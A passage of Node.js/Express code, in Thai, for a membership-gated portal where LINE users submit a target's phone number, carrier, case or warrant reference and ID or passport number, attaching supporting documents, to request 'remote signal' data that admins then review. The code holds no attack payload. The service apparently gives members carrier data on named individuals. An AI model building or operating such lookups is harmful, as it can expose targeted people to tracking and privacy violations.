      .replace(/'/g, '&#039;');


  // =====================================
  // ตรวจสถานะสมาชิก
  // =====================================
  const memberStatus =
    String(member?.status || '')
      .trim()
      .toLowerCase();


  const expireDate =
    member?.expireAt
      ? new Date(member.expireAt)
      : null;


  const hasExpireDate =
    expireDate &&
    !Number.isNaN(
      expireDate.getTime()
    );


  const expired =
    hasExpireDate &&
    expireDate.getTime() <= Date.now();


  const memberActive =
    memberStatus === 'approved' &&
    !expired;


  // =====================================
  // ตรวจสิทธิ์ระบบขอข้อมูลสัญญาณ
  // =====================================
  const remoteAllowed =
    memberActive &&
    db.remoteSignalPermissions?.[
      lineUser.userId
    ] === true;


  // =====================================
  // สร้าง CSRF Token สำหรับแบบฟอร์ม
  // =====================================
  const csrfToken =
    crypto
      .randomBytes(24)
      .toString('hex');

  req.session.signalCsrf =
    csrfToken;


  // =====================================
  // ข้อมูลสมาชิก
  // =====================================
  const lineName =
    escapeHtml(
      member?.lineName ||
      member?.displayName ||
      lineUser.displayName ||
      '-'
    );


  const uid =
    escapeHtml(
      lineUser.userId
    );


  const memberPhone =
    escapeHtml(
      member?.phone || '-'
    );


  const pictureUrl =
    lineUser.pictureUrl
      ? escapeHtml(
          lineUser.pictureUrl
        )
      : '';


  // =====================================
  // ส่งหน้าเว็บ
  // =====================================
  return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>
  ระบบขอข้อมูลสัญญาณระยะไกล
</title>


<style>

* {
  box-sizing: border-box;
}


body {

  margin: 0;

  min-height: 100vh;

  background: #070b11;

  color: #e5e7eb;

  font-family:
    Arial,
    Tahoma,
    sans-serif;

  padding: 18px;

}


.container {

  width: 100%;

  max-width: 620px;

  margin:
    15px auto
    50px;

  background: #10161f;

  border:
    1px solid
    #293747;

  border-radius: 22px;

  padding: 24px;

}


.top-title {

  color: #ffffff;

  font-size: 20px;

  font-weight: bold;

  line-height: 1.4;

}


.top-description {

  margin-top: 7px;

  color: #94a3b8;

  font-size: 12px;

  line-height: 1.7;

}


/* ==============================
   PROFILE
============================== */

.profile-title {

  margin-top: 25px;

  margin-bottom: 11px;

  color: #ffffff;

  font-size: 15px;

  font-weight: bold;

}


.profile-card {

  display: flex;

  align-items: center;

  gap: 15px;

  padding: 17px;

  background: #080d13;

  border:
    1px solid
    #293747;

  border-radius: 15px;

}


.avatar {

  width: 70px;

  height: 70px;

  flex-shrink: 0;

  border-radius: 50%;

  object-fit: cover;

  background: #1e293b;

  border:
    2px solid
    #334155;

}


.avatar-empty {

  width: 70px;

  height: 70px;

  flex-shrink: 0;

  border-radius: 50%;

  display: flex;

  align-items: center;

  justify-content: center;

  background: #1e293b;

  border:
    2px solid
    #334155;

  font-size: 30px;

}


.profile-label {

  color: #64748b;

  font-size: 10px;

}


.profile-name {

  margin-top: 3px;

  margin-bottom: 7px;

  color: #ffffff;

  font-size: 17px;

  font-weight: bold;

}


.profile-line {

  margin-top: 4px;

  color: #94a3b8;

  font-size: 11px;

  line-height: 1.5;

  word-break: break-all;

}


/* ==============================
   STATUS
============================== */

.status-area {

  margin-top: 13px;

  display: grid;

  gap: 9px;

}


.status-box {

  padding: 12px 14px;

  border-radius: 11px;

  font-size: 12px;

  font-weight: bold;

  line-height: 1.5;

}


.status-ok {

  color: #86efac;

  background: #092416;

  border:
    1px solid
    #245b38;

}


.status-lock {

  color: #fca5a5;

  background: #25130d;

  border:
    1px solid
    #6b3424;

}


/* ==============================
   DIVIDER
============================== */

.divider {

  border: 0;

  border-top:
    1px solid
    #293747;

  margin: 26px 0;

}


/* ==============================
   FORM
============================== */

.section-title {

  color: #ffffff;

  font-size: 17px;

  font-weight: bold;

  line-height: 1.5;

}


.section-description {

  margin-top: 6px;

  margin-bottom: 23px;

  color: #94a3b8;

  font-size: 12px;

  line-height: 1.8;

}


.field {

  margin-bottom: 19px;

}


.field-label {

  display: block;

  margin-bottom: 7px;

  color: #dbeafe;

  font-size: 12px;

  font-weight: bold;

}


.required {

  color: #f87171;

}


.field-help {

  margin-bottom: 8px;

  color: #64748b;

  font-size: 11px;

  line-height: 1.6;

}


input[type="text"],
input[type="tel"],
select {

  width: 100%;

  height: 49px;

  padding:
    0 14px;

  background: #080d13;

  color: #ffffff;

  border:
    1px solid
    #354355;

  border-radius: 10px;

  font-size: 14px;

  outline: none;

}


input:focus,
select:focus {

  border-color: #d7b56d;

}


select option {

  background: #10161f;

  color: #ffffff;

}


/* ==============================
   UPLOAD
============================== */

.upload-box {

  display: block;

  padding: 24px 18px;

  background: #080d13;

  border:
    1px dashed
    #52657c;

  border-radius: 13px;

  text-align: center;

  cursor: pointer;

}


.upload-box:hover {

  border-color: #d7b56d;

}


.upload-box input {

  display: none;

}


.upload-icon {

  font-size: 27px;

  margin-bottom: 7px;

}


.upload-title {

  color: #e5e7eb;

  font-size: 13px;

  font-weight: bold;

}


.upload-help {

  margin-top: 6px;

  color: #64748b;

  font-size: 11px;

  line-height: 1.6;

}


.file-name {

  margin-top: 10px;

  color: #d7b56d;

  font-size: 11px;

  line-height: 1.5;

  word-break: break-all;

}


/* ==============================
   POLICY
============================== */

.warning-box {

  margin-top: 25px;

  padding: 17px;

  background: #17130a;

  border:
    1px solid
    #55451c;

  border-radius: 13px;

}


.warning-title {

  margin-bottom: 9px;

  color: #f8d878;

  font-size: 13px;

  font-weight: bold;

}


.warning-text {

  color: #d8c99d;

  font-size: 11px;

  line-height: 1.9;

}


.consent {

  display: flex;

  align-items: flex-start;

  gap: 10px;

  margin-top: 16px;

  color: #e2e8f0;

  font-size: 11px;

  line-height: 1.7;

  cursor: pointer;

}


.consent input {

  width: 18px;

  height: 18px;

  flex-shrink: 0;

  margin-top: 2px;

  accent-color: #d7b56d;

}


/* ==============================
   BUTTON
============================== */

.submit-btn {

  width: 100%;

  height: 53px;

  margin-top: 23px;

  background: #d7b56d;

  color: #111111;

  border: 0;

  border-radius: 11px;

  font-size: 15px;

  font-weight: bold;

  cursor: pointer;

}


.submit-btn:hover {

  opacity: .94;

}


.submit-btn:disabled {

  opacity: .45;

  cursor: not-allowed;

}


/* ==============================
   NO PERMISSION
============================== */

.no-permission {

  padding: 18px;

  color: #fca5a5;

  background: #25130d;

  border:
    1px solid
    #6b3424;

  border-radius: 12px;

  font-size: 12px;

  line-height: 1.8;

}


.no-permission-title {

  margin-bottom: 7px;

  color: #fecaca;

  font-size: 14px;

  font-weight: bold;

}


.footer-note {

  margin-top: 24px;

  color: #475569;

  text-align: center;

  font-size: 10px;

  line-height: 1.7;

}

</style>

</head>


<body>


<div class="container">


  <!-- ==========================
       หัวข้อ
  =========================== -->

  <div class="top-title">

    📡 ระบบขอข้อมูลสัญญาณระยะไกล

  </div>


  <div class="top-description">

    สำหรับเจ้าหน้าที่ที่ได้รับอนุญาต
    ให้เข้าถึงและใช้งานตามหน้าที่เท่านั้น

  </div>



  <!-- ==========================
       ข้อมูลผู้ใช้งาน
  =========================== -->

  <div class="profile-title">

    👤 ข้อมูลผู้ใช้งาน

  </div>


  <div class="profile-card">


    ${
      pictureUrl
        ? `

    <img
      class="avatar"
      src="${pictureUrl}"
      alt="LINE Profile"
    >

          `
        : `

    <div class="avatar-empty">
      👤
    </div>

          `
    }


    <div>


      <div class="profile-label">

        ชื่อ LINE

      </div>


      <div class="profile-name">

        ${lineName}

      </div>


      <div class="profile-line">

        UID : ${uid}

      </div>


      <div class="profile-line">

        เบอร์สมาชิก : ${memberPhone}

      </div>


    </div>


  </div>



  <!-- ==========================
       สถานะ
  =========================== -->

  <div class="status-area">


    <div class="
      status-box
      ${
        memberActive
          ? 'status-ok'
          : 'status-lock'
      }
    ">


      ${
        memberActive
          ? '✅ สถานะสมาชิก : ใช้งานได้'
          : '🔒 สถานะสมาชิก : ไม่สามารถใช้งานได้'
      }


    </div>



    <div class="
      status-box
      ${
        remoteAllowed
          ? 'status-ok'
          : 'status-lock'
      }
    ">


      ${
        remoteAllowed
          ? '✅ สิทธิ์ขอข้อมูล : มีสิทธิ์ใช้งาน'
          : '🔒 สิทธิ์ขอข้อมูล : ไม่มีสิทธิ์ใช้งาน'
      }


    </div>


  </div>



  <hr class="divider">



  ${
    remoteAllowed
      ? `


  <!-- ==========================
       แบบฟอร์ม
  =========================== -->


  <div class="section-title">

    📋 รายละเอียดคำขอ

  </div>


  <div class="section-description">

    กรุณากรอกข้อมูลให้ครบถ้วน
    และตรวจสอบความถูกต้องก่อนส่งคำขอ

  </div>



  <form
    id="signalRequestForm"
    method="POST"
    action="/signal/request"
    enctype="multipart/form-data"
  >


    <input
      type="hidden"
      name="csrf"
      value="${csrfToken}"
    >



    <!-- หมายเลข -->


    <div class="field">


      <label class="field-label">

        หมายเลขที่ต้องการตรวจสอบ
        <span class="required">*</span>

      </label>


      <div class="field-help">

        กรุณาระบุหมายเลขโทรศัพท์ 10 หลัก

      </div>


      <input
        id="targetPhone"
        type="tel"
        name="targetPhone"
        inputmode="numeric"
        maxlength="10"
        pattern="0[0-9]{9}"
        autocomplete="off"
        placeholder="เช่น 0812345678"
        required
      >


    </div>



    <!-- เครือข่าย -->


    <div class="field">


      <label class="field-label">

        เครือข่าย
        <span class="required">*</span>

      </label>


      <select
        name="network"
        required
      >


        <option value="">

          -- เลือกเครือข่าย --

        </option>


        <option value="AIS">

          AIS

        </option>


        <option value="TRUE">

          TRUE

        </option>


        <option value="DTAC">

          DTAC

        </option>


      </select>


    </div>



    <!-- เคส -->


    <div class="field">


      <label class="field-label">

        ชื่อเคสคดี / เคสหมายจับ
        <span class="required">*</span>

      </label>


      <div class="field-help">

        ระบุชื่อคดี เลขคดี
        หรือข้อมูลอ้างอิงที่เกี่ยวข้อง

      </div>


      <input
        type="text"
        name="caseName"
        maxlength="250"
        autocomplete="off"
        placeholder="ระบุชื่อหรือเลขอ้างอิงคดี"
        required
      >


    </div>



    <!-- ประเภทข้อมูลเป้าหมาย -->


    <div class="field">


      <label class="field-label">

        ประเภทข้อมูลเป้าหมาย
        <span class="required">*</span>

      </label>


      <div class="field-help">

        เลือกข้อมูลอย่างใดอย่างหนึ่ง

      </div>


      <select
        id="targetType"
        name="targetType"
        required
      >


        <option value="">

          -- เลือกประเภทข้อมูล --

        </option>


        <option value="name">

          ชื่อ - นามสกุล

        </option>


        <option value="idcard">

          เลขประจำตัว 13 หลัก

        </option>


        <option value="passport">

          เลขหนังสือเดินทาง

        </option>


      </select>


    </div>



    <!-- ข้อมูลเป้าหมาย -->


    <div class="field">


      <label class="field-label">

        ข้อมูลเป้าหมาย
        <span class="required">*</span>

      </label>


      <div
        id="targetHelp"
        class="field-help"
      >

        ชื่อ - นามสกุล /
        เลขประจำตัว 13 หลัก /
        เลขหนังสือเดินทาง

      </div>


      <input
        id="targetValue"
        type="text"
        name="targetValue"
        maxlength="300"
        autocomplete="off"
        placeholder="กรอกข้อมูลเป้าหมาย"
        required
      >


    </div>



    <!-- เอกสาร -->


    <div class="field">


      <label class="field-label">

        เอกสารประกอบ
        <span class="required">*</span>

      </label>


      <div class="field-help">

        กรณีคดี:
        แนบเอกสาร ปจว.
        หรือเอกสารที่เกี่ยวข้อง

        <br>

        กรณีหมายจับ:
        แนบสำเนาหมายจับ

      </div>


      <label class="upload-box">


        <input
          id="evidence"
          type="file"
          name="evidence"
          accept="image/jpeg,image/png"
          required
        >


        <div class="upload-icon">

          📎

        </div>


        <div class="upload-title">

          เลือกรูปภาพเอกสาร

        </div>


        <div class="upload-help">

          รองรับไฟล์ JPG / PNG
          สูงสุด 8 MB

        </div>


        <div
          id="fileName"
          class="file-name"
        >
        </div>


      </label>


    </div>



    <!-- ==========================
         ข้อกำหนด
    =========================== -->


    <div class="warning-box">


      <div class="warning-title">

        ⚠️ ข้อกำหนดการใช้ข้อมูล

      </div>


      <div class="warning-text">

        ข้อมูลที่ได้รับอนุญาตให้เข้าถึง
        ให้ใช้เฉพาะเพื่อการปฏิบัติหน้าที่
        ตามคำขอที่ได้รับอนุมัติเท่านั้น

        <br><br>

        ห้ามนำข้อมูลไปเผยแพร่สู่ภายนอก
        ส่งต่อให้บุคคลที่ไม่เกี่ยวข้องกับหน้าที่
        หรือนำไปใช้เพื่อประโยชน์ส่วนบุคคล

        <br><br>

        ห้ามนำข้อมูลไปแสวงหาผลประโยชน์
        เชิงพาณิชย์กับบุคคลภายนอก

        <br><br>

        ระบบอาจบันทึกข้อมูลผู้ยื่นคำขอ
        วันเวลา และรายละเอียดคำขอ
        เพื่อใช้ในการตรวจสอบการใช้งาน

      </div>



      <label class="consent">


        <input
          id="dataAgreement"
          type="checkbox"
          name="dataAgreement"
          value="yes"
          required
        >


        <span>

          ข้าพเจ้าได้อ่านและรับทราบ
          ข้อกำหนดการใช้งานข้อมูล
          และยืนยันว่าจะใช้ข้อมูล
          เฉพาะเพื่อการปฏิบัติหน้าที่
          ที่เกี่ยวข้องเท่านั้น

        </span>


      </label>


    </div>



    <!-- ปุ่มส่ง -->


    <button
      id="submitButton"
      class="submit-btn"
      type="submit"
    >

      📤 ส่งคำขอข้อมูล

    </button>


  </form>


        `
      : `


  <!-- ==========================
       ไม่มีสิทธิ์
  =========================== -->


  <div class="no-permission">


    <div class="no-permission-title">

      🔒 ยังไม่มีสิทธิ์ใช้งาน

    </div>


    บัญชีของท่านยังไม่ได้รับสิทธิ์
    สำหรับระบบขอข้อมูลสัญญาณระยะไกล

    <br><br>

    ระบบจะเปิดแบบฟอร์มคำขอ
    หลังจากผู้ดูแลระบบอนุญาตสิทธิ์แล้ว


  </div>


        `
  }



  <div class="footer-note">

    การเข้าถึงและใช้งานระบบ
    จะถูกตรวจสอบตามสิทธิ์ของสมาชิก

  </div>


</div>



<script>


// =====================================
// แสดงชื่อไฟล์ที่เลือก
// =====================================

const evidence =
  document.getElementById(
    'evidence'
  );


const fileName =
  document.getElementById(
    'fileName'
  );


if (
  evidence &&
  fileName
) {

  evidence.addEventListener(
    'change',
    function () {

      if (
        this.files &&
        this.files.length > 0
      ) {

        const file =
          this.files[0];


        fileName.textContent =
          'ไฟล์ที่เลือก : ' +
          file.name;


      } else {

        fileName.textContent =
          '';

      }

    }
  );

}



// =====================================
// เปลี่ยน Placeholder ตามประเภทเป้าหมาย
// =====================================

const targetType =
  document.getElementById(
    'targetType'
  );


const targetValue =
  document.getElementById(
    'targetValue'
  );


const targetHelp =
  document.getElementById(
    'targetHelp'
  );


if (
  targetType &&
  targetValue
) {

  targetType.addEventListener(
    'change',
    function () {

      const type =
        this.value;


      if (type === 'name') {

        targetValue.placeholder =
          'เช่น สมชาย ใจดี';

        targetValue.inputMode =
          'text';

        targetValue.maxLength =
          300;


        if (targetHelp) {

          targetHelp.textContent =
            'ระบุชื่อ - นามสกุลของเป้าหมาย';

        }


      } else if (
        type === 'idcard'
      ) {

        targetValue.placeholder =
          'กรอกเลขประจำตัว 13 หลัก';

        targetValue.inputMode =
          'numeric';

        targetValue.maxLength =
          13;


        if (targetHelp) {

          targetHelp.textContent =
            'ระบุเลขประจำตัว 13 หลัก';

        }


      } else if (
        type === 'passport'
      ) {

        targetValue.placeholder =
          'กรอกเลขหนังสือเดินทาง';

        targetValue.inputMode =
          'text';

        targetValue.maxLength =
          30;


        if (targetHelp) {

          targetHelp.textContent =
            'ระบุเลขหนังสือเดินทางของเป้าหมาย';

        }


      } else {

        targetValue.placeholder =
          'กรอกข้อมูลเป้าหมาย';

        targetValue.inputMode =
          'text';

        targetValue.maxLength =
          300;

      }

    }
  );

}



// =====================================
// หมายเลขโทรศัพท์ให้รับเฉพาะตัวเลข
// =====================================

const targetPhone =
  document.getElementById(
    'targetPhone'
  );


if (targetPhone) {

  targetPhone.addEventListener(
    'input',
    function () {

      this.value =
        this.value
          .replace(/\\D/g, '')
          .slice(0, 10);

    }
  );

}



// =====================================
// เลขบัตรให้รับเฉพาะตัวเลข
// =====================================

if (targetValue) {

  targetValue.addEventListener(
    'input',
    function () {

      if (
        targetType &&
        targetType.value === 'idcard'
      ) {

        this.value =
          this.value
            .replace(/\\D/g, '')
            .slice(0, 13);

      }

    }
  );

}



// =====================================
// ป้องกันกดส่งซ้ำ
// =====================================

const signalRequestForm =
  document.getElementById(
    'signalRequestForm'
  );


const submitButton =
  document.getElementById(
    'submitButton'
  );


if (
  signalRequestForm &&
  submitButton
) {

  signalRequestForm.addEventListener(
    'submit',
    function () {

      submitButton.disabled =
        true;

      submitButton.textContent =
        '⏳ กำลังส่งคำขอ...';

    }
  );

}


</script>


</body>

</html>
  `);

});

// =====================================
// SIGNAL REQUEST SUBMIT
// =====================================
app.post('/signal/request', (req, res) => {

  signalRequestUpload.single('evidence')(
    req,
    res,
    async (uploadErr) => {

      // =====================================
      // ฟังก์ชันลบไฟล์ที่เพิ่งอัปโหลด
      // ใช้กรณี validation ไม่ผ่าน
      // =====================================
      const deleteUploadedFile = () => {

        if (req.file?.path) {

          fs.unlink(
            req.file.path,
            () => {}
          );

        }

      };


      try {

        // =====================================
        // MULTER ERROR
        // =====================================
        if (uploadErr) {

          console.error(
            'SIGNAL UPLOAD ERROR:',
            uploadErr
          );

          return res.status(400).send(
            '❌ ไม่สามารถอัปโหลดเอกสารได้: ' +
            uploadErr.message
          );

        }


        // =====================================
        // ตรวจ LINE SESSION
        // =====================================
        const lineUser =
          req.session.lineUser;


        if (!lineUser?.userId) {

          deleteUploadedFile();

          return res.redirect(
            '/line/login?next=%2Fsignal%2Frequest'
          );

        }


        // =====================================
        // ตรวจ CSRF TOKEN
        // =====================================
        const csrf =
          String(
            req.body.csrf || ''
          );


        const sessionCsrf =
          String(
            req.session.signalCsrf || ''
          );


        if (
          !csrf ||
          !sessionCsrf ||
          csrf !== sessionCsrf
        ) {

          deleteUploadedFile();

          return res.status(403).send(
            '❌ แบบฟอร์มหมดอายุหรือไม่ถูกต้อง กรุณาเปิดหน้าใหม่อีกครั้ง'
          );

        }


        // =====================================
        // โหลด DATABASE
        // =====================================
        const db =
          loadDB();


        db.members =
          db.members || {};


        db.remoteSignalPermissions =
          db.remoteSignalPermissions || {};


        db.signalRequests =
          db.signalRequests || {};


        const member =
          db.members[
            lineUser.userId
          ];


        // =====================================
        // ต้องเป็นสมาชิกในระบบ
        // =====================================
        if (!member) {

          deleteUploadedFile();

          return res.status(403).send(
            '❌ ไม่พบข้อมูลสมาชิกในระบบ'
          );

        }


        // =====================================
        // ตรวจสถานะสมาชิก
        // =====================================
        const memberStatus =
          String(
            member.status || ''
          )
            .trim()
            .toLowerCase();


        const expireDate =
          member.expireAt
            ? new Date(
                member.expireAt
              )
            : null;


        const hasExpireDate =
          expireDate &&
          !Number.isNaN(
            expireDate.getTime()
          );


        const expired =
          hasExpireDate &&
          expireDate.getTime()
            <= Date.now();


        const memberActive =
          memberStatus === 'approved' &&
          !expired;


        // =====================================
        // ตรวจสิทธิ์เฉพาะระบบนี้
        // =====================================
        const remoteAllowed =
          memberActive &&
          db.remoteSignalPermissions?.[
            lineUser.userId
          ] === true;


        if (!remoteAllowed) {

          deleteUploadedFile();

          return res.status(403).send(
            '🔒 บัญชีนี้ไม่มีสิทธิ์ใช้งานระบบขอข้อมูล'
          );

        }


        // =====================================
        // อ่านค่าจาก FORM
        // =====================================
        const targetPhone =
          String(
            req.body.targetPhone || ''
          )
            .replace(/\D/g, '')
            .trim();


        const network =
          String(
            req.body.network || ''
          )
            .trim()
            .toUpperCase();


        const caseName =
          String(
            req.body.caseName || ''
          )
            .trim();


        const targetType =
          String(
            req.body.targetType || ''
          )
            .trim()
            .toLowerCase();


        let targetValue =
          String(
            req.body.targetValue || ''
          )
            .trim();


        const dataAgreement =
          req.body.dataAgreement === 'yes';


        // =====================================
        // ตรวจหมายเลขโทรศัพท์
        // =====================================
        if (
          !/^0\d{9}$/.test(
            targetPhone
          )
        ) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณาระบุหมายเลขโทรศัพท์ 10 หลักให้ถูกต้อง'
          );

        }


        // =====================================
        // ตรวจ NETWORK
        // =====================================
        const allowedNetworks = [
          'AIS',
          'TRUE',
          'DTAC'
        ];


        if (
          !allowedNetworks.includes(
            network
          )
        ) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณาเลือกเครือข่ายให้ถูกต้อง'
          );

        }


        // =====================================
        // ตรวจข้อมูลเคส
        // =====================================
        if (
          !caseName ||
          caseName.length > 250
        ) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณาระบุชื่อเคสคดีหรือข้อมูลอ้างอิงให้ถูกต้อง'
          );

        }


        // =====================================
        // ตรวจประเภทข้อมูลเป้าหมาย
        // =====================================
        const allowedTargetTypes = [
          'name',
          'idcard',
          'passport'
        ];


        if (
          !allowedTargetTypes.includes(
            targetType
          )
        ) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณาเลือกประเภทข้อมูลเป้าหมาย'
          );

        }


        // =====================================
        // ตรวจข้อมูลเป้าหมาย
        // =====================================
        if (
          !targetValue ||
          targetValue.length > 300
        ) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณาระบุข้อมูลเป้าหมาย'
          );

        }


        // =====================================
        // ถ้าเลือกเลขประจำตัว
        // ต้องมี 13 หลัก
        // =====================================
        if (
          targetType === 'idcard'
        ) {

          targetValue =
            targetValue.replace(
              /\D/g,
              ''
            );


          if (
            !/^\d{13}$/.test(
              targetValue
            )
          ) {

            deleteUploadedFile();

            return res.status(400).send(
              '❌ เลขประจำตัวต้องมี 13 หลัก'
            );

          }

        }


        // =====================================
        // ตรวจเอกสาร
        // =====================================
        if (!req.file) {

          return res.status(400).send(
            '❌ กรุณาแนบเอกสารประกอบคำขอ'
          );

        }


        // =====================================
        // ตรวจการยอมรับข้อกำหนด
        // =====================================
        if (!dataAgreement) {

          deleteUploadedFile();

          return res.status(400).send(
            '❌ กรุณายืนยันการรับทราบข้อกำหนดการใช้งานข้อมูล'
          );

        }


        // =====================================
        // สร้างเลขคำขอ
        // =====================================
        const requestId =
          'SIG-' +
          Date.now()
            .toString(36)
            .toUpperCase() +
          '-' +
          crypto
            .randomBytes(3)
            .toString('hex')
            .toUpperCase();


        // =====================================
        // ชื่อประเภทข้อมูล
        // =====================================
        const targetTypeText = {

          name:
            'ชื่อ - นามสกุล',

          idcard:
            'เลขประจำตัว 13 หลัก',

          passport:
            'เลขหนังสือเดินทาง'

        }[targetType];


        // =====================================
        // วันที่ปัจจุบัน
        // =====================================
        const createdAt =
          new Date().toISOString();


        // =====================================
        // DATA ที่จะบันทึก
        // =====================================
        const requestData = {

          requestId,

          requester: {

            userId:
              lineUser.userId,

            lineName:
              lineUser.displayName ||
              member.lineName ||
              member.displayName ||
              '',

            memberPhone:
              member.phone || ''

          },


          request: {

            targetPhone,

            network,

            caseName,

            targetType,

            targetTypeText,

            targetValue

          },


          evidence: {

            fileName:
              req.file.filename,

            originalName:
              req.file.originalname,

            mimeType:
              req.file.mimetype,

            size:
              req.file.size || 0

          },


          agreementAccepted:
            true,

          agreementAcceptedAt:
            createdAt,

          agreementVersion:
            '2026-10-04',


          status:
            'pending',


          createdAt,

          updatedAt:
            createdAt

        };


        // =====================================
        // บันทึก DATABASE
        // =====================================
        db.signalRequests[
          requestId
        ] = requestData;


        saveDB(db);


        // =====================================
        // ลบ CSRF หลังใช้งาน
        // =====================================
        delete req.session.signalCsrf;


        // =====================================
        // FLEX แจ้ง ADMIN
        // =====================================
        const adminFlex = {

          type: 'flex',

          altText:
            " มีคำขอข้อมูลสัญญาณใหม่",

          contents: {

            type: 'bubble',

            size: 'mega',


            // ===============================
            // HEADER
            // ===============================
            header: {

              type: 'box',

              layout: 'vertical',

              backgroundColor:
                '#0F172A',

              paddingAll:
                '18px',

              contents: [

                {
                  type: 'text',

                  text:
                    " คำขอข้อมูลสัญญาณใหม่",

                  color:
                    '#FFFFFF',

                  weight:
                    'bold',

                  size:
                    'lg',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `เลขคำขอ : ${requestId}`,

                  color:
                    '#94A3B8',

                  size:
                    'xs',

                  margin:
                    'sm',

                  wrap:
                    true
                }

              ]
            },


            // ===============================
            // BODY
            // ===============================
            body: {

              type: 'box',

              layout: 'vertical',

              spacing: 'md',

              paddingAll:
                '18px',

              contents: [

                // ===========================
                // สมาชิก
                // ===========================

                {
                  type: 'text',

                  text:
                    " ข้อมูลสมาชิก",

                  weight:
                    'bold',

                  color:
                    '#111827'
                },


                {
                  type: 'text',

                  text:
                    `LINE : ${
                      lineUser.displayName ||
                      member.lineName ||
                      member.displayName ||
                      '-'
                    }`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `UID : ${lineUser.userId}`,

                  size:
                    'xs',

                  color:
                    '#64748B',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `เบอร์สมาชิก : ${
                      member.phone || '-'
                    }`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'separator',

                  margin:
                    'md'
                },


                // ===========================
                // ข้อมูลคำขอ
                // ===========================

                {
                  type: 'text',

                  text:
                    " รายละเอียดคำขอ",

                  weight:
                    'bold',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    ` หมายเลข : ${targetPhone}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    ` เครือข่าย : ${network}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    ` เคส : ${caseName}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    ` ${targetTypeText} : ${targetValue}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    " เอกสารประกอบ : แนบแล้ว",

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'separator',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    " สถานะ : รอตรวจสอบ",

                  color:
                    '#D97706',

                  weight:
                    'bold',

                  size:
                    'sm',

                  margin:
                    'md',

                  wrap:
                    true
                }

              ]
            }

          }

        };


        // =====================================
        // ส่งแจ้งเตือน ADMIN
        // =====================================
        try {

          await notifyAdmins(
            adminFlex
          );

        } catch (adminErr) {

          console.error(
            'SIGNAL ADMIN NOTIFY ERROR:',
            adminErr.response?.data ||
            adminErr.message ||
            adminErr
          );

        }


        // =====================================
        // FLEX แจ้งสมาชิก
        // =====================================
        const memberFlex = {

          type: 'flex',

          altText:
            '✅ ส่งคำขอข้อมูลเรียบร้อยแล้ว',

          contents: {

            type: 'bubble',


            // ===============================
            // HEADER
            // ===============================
            header: {

              type: 'box',

              layout: 'vertical',

              backgroundColor:
                '#0F172A',

              paddingAll:
                '18px',

              contents: [

                {
                  type: 'text',

                  text:
                    '✅ รับคำขอเรียบร้อยแล้ว',

                  color:
                    '#FFFFFF',

                  weight:
                    'bold',

                  size:
                    'lg',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    `เลขคำขอ : ${requestId}`,

                  color:
                    '#94A3B8',

                  size:
                    'xs',

                  margin:
                    'sm',

                  wrap:
                    true
                }

              ]
            },


            // ===============================
            // BODY
            // ===============================
            body: {

              type: 'box',

              layout: 'vertical',

              spacing:
                'md',

              paddingAll:
                '18px',

              contents: [

                {
                  type: 'text',

                  text:
                    ` หมายเลข : ${targetPhone}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    ` เครือข่าย : ${network}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'text',

                  text:
                    ` เคส : ${caseName}`,

                  size:
                    'sm',

                  wrap:
                    true
                },


                {
                  type: 'separator',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    " สถานะ : รอผู้ดูแลระบบตรวจสอบ",

                  color:
                    '#D97706',

                  weight:
                    'bold',

                  size:
                    'sm',

                  margin:
                    'md',

                  wrap:
                    true
                },


                {
                  type: 'separator',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    '⚠️ ข้อกำหนดการใช้ข้อมูล',

                  weight:
                    'bold',

                  color:
                    '#92400E',

                  size:
                    'sm',

                  margin:
                    'md'
                },


                {
                  type: 'text',

                  text:
                    'ห้ามนำข้อมูลที่ได้รับไปเผยแพร่สู่ภายนอก ส่งต่อให้บุคคลที่ไม่เกี่ยวข้องกับหน้าที่ ใช้เพื่อประโยชน์ส่วนบุคคล หรือนำไปแสวงหาผลประโยชน์เชิงพาณิชย์กับบุคคลภายนอก',

                  color:
                    '#64748B',

                  size:
                    'xs',

                  wrap:
                    true
                }

              ]
            }

          }

        };


        // =====================================
        // ส่งแจ้งเตือนกลับไปยังสมาชิก
        // =====================================
        try {

          await push(
            lineUser.userId,
            memberFlex
          );

        } catch (memberErr) {

          console.error(
            'SIGNAL MEMBER NOTIFY ERROR:',
            memberErr.response?.data ||
            memberErr.message ||
            memberErr
          );

        }


        // =====================================
        // SUCCESS PAGE
        // =====================================
        return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>
  ส่งคำขอเรียบร้อยแล้ว
</title>

</head>


<body style="
  margin:0;
  min-height:100vh;
  background:#070b11;
  color:#ffffff;
  font-family:Arial,Tahoma,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
">


<div style="
  width:100%;
  max-width:460px;
  background:#10161f;
  border:1px solid #293747;
  border-radius:20px;
  padding:32px 24px;
  text-align:center;
">


  <div style="
    font-size:50px;
  ">

    ✅

  </div>


  <div style="
    margin-top:15px;
    font-size:20px;
    font-weight:bold;
  ">

